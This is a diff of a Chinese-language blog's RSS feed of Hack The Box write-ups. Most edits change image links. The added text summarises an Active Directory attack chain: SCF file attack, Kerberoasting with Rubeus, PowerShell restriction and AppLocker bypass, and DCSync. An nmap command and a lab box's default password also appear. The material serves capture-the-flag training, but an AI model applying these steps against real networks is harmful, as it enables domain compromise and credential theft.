+&lt;p&gt;成功拿到shell&lt;/p&gt;
+&lt;p&gt;再交完用户和系统标志后来理一下这个靶机的流程&lt;/p&gt;
+&lt;p&gt;扫到匿名smb共享目录，发写可写的俩个文件夹，同时存在交互（删除文件）满足SCF文件攻击的特性&amp;ndash;&amp;gt;拿到初始用户&amp;ndash;&amp;gt;发现用户密码能够用在搓证书的网页搓证书得以登陆evil-winrm&amp;ndash;&amp;gt;bloodhound-python得知mrlky用户有SPN标志，满足Kerberoasting攻击&amp;ndash;&amp;gt;impacket攻击不作用使用Rubeus攻击，但是发现power shell受限&amp;ndash;&amp;gt;利用PSByPassCLM突破限制&amp;ndash;&amp;gt;后又存在AppLocker限制将文件放在特殊的文件夹下得以破解&amp;ndash;&amp;gt;使用rubeus.exe拿到mrlky的hash&amp;ndash;&amp;gt;拿到账户密码发动DCSync攻击&lt;/p&gt;
+</description>
+        </item>
+        <item>
         <title>Resolute</title>
         <link>https://nergigantes.github.io/htb/resolute/</link>
         <pubDate>Sat, 29 Mar 2025 13:36:57 +0800</pubDate>
         
         <guid>https://nergigantes.github.io/htb/resolute/</guid>
-        <description>&lt;img src="https://nergigantes.github.io/htb/resolute/10.jpg" alt="Featured image of post Resolute" /&gt;&lt;h1 id=&#34;速通教程&#34;&gt;速通教程：
+        <description>&lt;img src="https://nergigantes.github.io/10.jpg" alt="Featured image of post Resolute" /&gt;&lt;h1 id=&#34;速通教程&#34;&gt;速通教程：
 &lt;/h1&gt;&lt;p&gt;使用netexec扫一下漏洞&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -207,7 +556,7 @@
         <pubDate>Sat, 29 Mar 2025 13:36:53 +0800</pubDate>
         
         <guid>https://nergigantes.github.io/htb/blackfield/</guid>
-        <description>&lt;img src="https://nergigantes.github.io/htb/blackfield/19.jpg" alt="Featured image of post Blackfield" /&gt;&lt;p&gt;扫一下端口&lt;/p&gt;
+        <description>&lt;img src="https://nergigantes.github.io/19.jpg" alt="Featured image of post Blackfield" /&gt;&lt;p&gt;扫一下端口&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/blackfield/1742784922578-e573fa60-eb3d-4381-b080-4edb2318aaf0.png&#34;
 	width=&#34;1178&#34;
 	height=&#34;799&#34;
@@ -525,7 +874,7 @@
         <pubDate>Sat, 22 Mar 2025 19:05:53 +0800</pubDate>
         
         <guid>https://nergigantes.github.io/htb/sauna/</guid>
-        <description>&lt;img src="https://nergigantes.github.io/htb/sauna/3.jpg" alt="Featured image of post Sauna" /&gt;&lt;p&gt;扫端口&lt;/p&gt;
+        <description>&lt;img src="https://nergigantes.github.io/3.jpg" alt="Featured image of post Sauna" /&gt;&lt;p&gt;扫端口&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/sauna/1742544068788-0b5e774d-9fad-43df-8798-bb6646c2111e.png&#34;
 	width=&#34;1168&#34;
 	height=&#34;821&#34;
@@ -668,7 +1017,7 @@ DefaultPassword               :  Moneymakestheworldgoround!
         <pubDate>Sat, 22 Mar 2025 19:05:52 +0800</pubDate>
         
         <guid>https://nergigantes.github.io/htb/active/</guid>
-        <description>&lt;img src="https://nergigantes.github.io/htb/active/1.jpg" alt="Featured image of post Active" /&gt;&lt;p&gt;端口信息：&lt;/p&gt;
+        <description>&lt;img src="https://nergigantes.github.io/1.jpg" alt="Featured image of post Active" /&gt;&lt;p&gt;端口信息：&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/active/1742632854854-be7899f7-4d73-4344-a0d4-b150209812c6.png&#34;
 	width=&#34;1300&#34;
 	height=&#34;1111&#34;
@@ -751,7 +1100,7 @@ DefaultPassword               :  Moneymakestheworldgoround!
         <pubDate>Sat, 22 Mar 2025 19:00:49 +0800</pubDate>
         
         <guid>https://nergigantes.github.io/htb/forest/</guid>
-        <description>&lt;img src="https://nergigantes.github.io/htb/forest/27.jpg" alt="Featured image of post Forest" /&gt;&lt;p&gt;扫端口&lt;/p&gt;
+        <description>&lt;img src="https://nergigantes.github.io/27.jpg" alt="Featured image of post Forest" /&gt;&lt;p&gt;扫端口&lt;/p&gt;
 &lt;p&gt;nmap -sCV -A 10.10.10.161&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://nergigantes.github.io/htb/forest/1742439388416-045b031c-7131-4cb7-93ff-25530f74c781.png&#34;
 	width=&#34;1343&#34;
